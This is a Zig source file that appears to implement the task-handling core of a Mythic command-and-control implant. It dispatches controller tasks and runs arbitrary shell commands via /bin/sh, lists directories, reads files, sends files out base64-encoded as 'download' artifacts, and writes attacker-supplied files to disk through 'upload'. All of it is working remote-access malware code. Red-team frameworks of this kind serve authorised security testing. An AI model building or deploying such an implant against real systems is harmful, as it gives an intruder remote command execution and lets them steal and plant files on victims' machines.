const std = @import("std");
const types = @import("types.zig");
const json = std.json;
const base64 = std.base64;
const Allocator = std.mem.Allocator;
const ArrayList = std.ArrayList;

const MythicTask = types.MythicTask;
const MythicResponse = types.MythicResponse;

pub const CommandExecutor = struct {
    allocator: Allocator,
    
    pub fn init(allocator: Allocator) CommandExecutor {
        return CommandExecutor{
            .allocator = allocator,
        };
    }
    
    pub fn executeTask(self: *CommandExecutor, task: MythicTask) !MythicResponse {
        if (std.mem.eql(u8, task.command, "shell")) {
            return try self.executeShell(task);
        } else if (std.mem.eql(u8, task.command, "pwd")) {
            return try self.executePwd(task);
        } else if (std.mem.eql(u8, task.command, "ls")) {
            return try self.executeLs(task);
        } else if (std.mem.eql(u8, task.command, "cat")) {
            return try self.executeCat(task);
        } else if (std.mem.eql(u8, task.command, "download")) {
            return try self.executeDownload(task);
        } else if (std.mem.eql(u8, task.command, "upload")) {
            return try self.executeUpload(task);
        } else {
            return MythicResponse{
                .task_id = task.id,
                .user_output = try std.fmt.allocPrint(self.allocator, "Unknown command: {s}", .{task.command}),
                .completed = true,
                .status = "error",
            };
        }
    }
    
    fn executeShell(self: *CommandExecutor, task: MythicTask) !MythicResponse {
        const ShellParameters = struct {
            command: []const u8,
        };
        const parsed = try json.parseFromSlice(ShellParameters, self.allocator, task.parameters, .{});
        defer parsed.deinit();
        const command = parsed.value.command;
        if (command.len == 0) {
            return MythicResponse{
                .task_id = task.id,
                .user_output = "No command provided",
                .completed = true,
                .status = "error",
            };
        }
        const result = std.process.Child.run(.{
            .allocator = self.allocator,
            .argv = &[_][]const u8{ "/bin/sh", "-c", command },
        }) catch |err| {
            return MythicResponse{
                .task_id = task.id,
                .user_output = try std.fmt.allocPrint(self.allocator, "Failed to execute shell command: {}", .{err}),
                .completed = true,
                .status = "error",
            };
        };
        
        defer self.allocator.free(result.stdout);
        defer self.allocator.free(result.stderr);
        
        const output = if (result.stdout.len > 0) result.stdout else result.stderr;
        
        return MythicResponse{
            .task_id = task.id,
            .user_output = try self.allocator.dupe(u8, output),
            .completed = true,
            .status = "completed",
        };
    }
    
    fn executePwd(self: *CommandExecutor, task: MythicTask) !MythicResponse {
        const cwd = std.process.getCwdAlloc(self.allocator) catch |err| {
            return MythicResponse{
                .task_id = task.id,
                .user_output = try std.fmt.allocPrint(self.allocator, "Failed to get current directory: {}", .{err}),
                .completed = true,
                .status = "error",
            };
        };
        
        return MythicResponse{
            .task_id = task.id,
            .user_output = cwd,
            .completed = true,
            .status = "completed",
        };
    }
    
    fn executeLs(self: *CommandExecutor, task: MythicTask) !MythicResponse {
        const Parameters = struct {
            path: []const u8 = ".",
        };

        const parsed = try json.parseFromSlice(Parameters, self.allocator, task.parameters, .{});
        defer parsed.deinit();

        const path = parsed.value.path;

        var dir = std.fs.cwd().openDir(path, .{ .iterate = true }) catch |err| {
            return MythicResponse{
                .task_id = task.id,
                .user_output = try std.fmt.allocPrint(self.allocator, "Failed to open directory '{s}': {}", .{ path, err }),
                .completed = true,
                .status = "error",
            };
        };
        defer dir.close();

        var output = ArrayList(u8).init(self.allocator);
        defer output.deinit();

        var iterator = dir.iterate();
        while (try iterator.next()) |entry| {
            try output.appendSlice(entry.name);
            try output.append('\n');
        }

        return MythicResponse{
            .task_id = task.id,
            .user_output = try output.toOwnedSlice(),
            .completed = true,
            .status = "completed",
        };
    }

    fn executeCat(self: *CommandExecutor, task: MythicTask) !MythicResponse {
        if (task.parameters.len == 0) {
            return MythicResponse{
                .task_id = task.id,
                .user_output = "No filename provided",
                .completed = true,
                .status = "error",
            };
        }
        
        const content = std.fs.cwd().readFileAlloc(self.allocator, task.parameters, 1024 * 1024) catch |err| {
            return MythicResponse{
                .task_id = task.id,
                .user_output = try std.fmt.allocPrint(self.allocator, "Failed to read file {s}: {}", .{ task.parameters, err }),
                .completed = true,
                .status = "error",
            };
        };
        
        return MythicResponse{
            .task_id = task.id,
            .user_output = content,
            .completed = true,
            .status = "completed",
        };
    }
    
    fn executeDownload(self: *CommandExecutor, task: MythicTask) !MythicResponse {
        const file_content = std.fs.cwd().readFileAlloc(self.allocator, task.parameters, 10 * 1024 * 1024) catch |err| {
            return MythicResponse{
                .task_id = task.id,
                .user_output = try std.fmt.allocPrint(self.allocator, "Failed to read file for download: {}", .{err}),
                .completed = true,
                .status = "error",
            };
        };
        defer self.allocator.free(file_content);
        
        const encoder = base64.standard.Encoder;
        const encoded_size = encoder.calcSize(file_content.len);
        const encoded_content = try self.allocator.alloc(u8, encoded_size);
        _ = encoder.encode(encoded_content, file_content);
        
        return MythicResponse{
            .task_id = task.id,
            .user_output = try std.fmt.allocPrint(self.allocator, "File downloaded: {s} ({d} bytes)", .{ task.parameters, file_content.len }),
            .completed = true,
            .status = "completed",
            .artifacts = encoded_content,
        };
    }
    
    fn executeUpload(self: *CommandExecutor, task: MythicTask) !MythicResponse {
        const parsed = json.parseFromSlice(json.Value, self.allocator, task.parameters, .{}) catch {
            return MythicResponse{
                .task_id = task.id,
                .user_output = "Invalid upload parameters",
                .completed = true,
                .status = "error",
            };
        };
        defer parsed.deinit();
        
        const filename = parsed.value.object.get("filename").?.string;
        const b64_content = parsed.value.object.get("content").?.string;
        
        const decoder = base64.standard.Decoder;
        const decoded_size = try decoder.calcSizeForSlice(b64_content);
        const decoded_content = try self.allocator.alloc(u8, decoded_size);
        defer self.allocator.free(decoded_content);
        
        try decoder.decode(decoded_content, b64_content);
        
        std.fs.cwd().writeFile(.{ .sub_path = filename, .data = decoded_content }) catch |err| {
            return MythicResponse{
                .task_id = task.id,
                .user_output = try std.fmt.allocPrint(self.allocator, "Failed to write file: {}", .{err}),
                .completed = true,
                .status = "error",
            };
        };
        
        return MythicResponse{
            .task_id = task.id,
            .user_output = try std.fmt.allocPrint(self.allocator, "File uploaded: {s} ({d} bytes)", .{ filename, decoded_content.len }),
            .completed = true,
            .status = "completed",
        };
    }
};
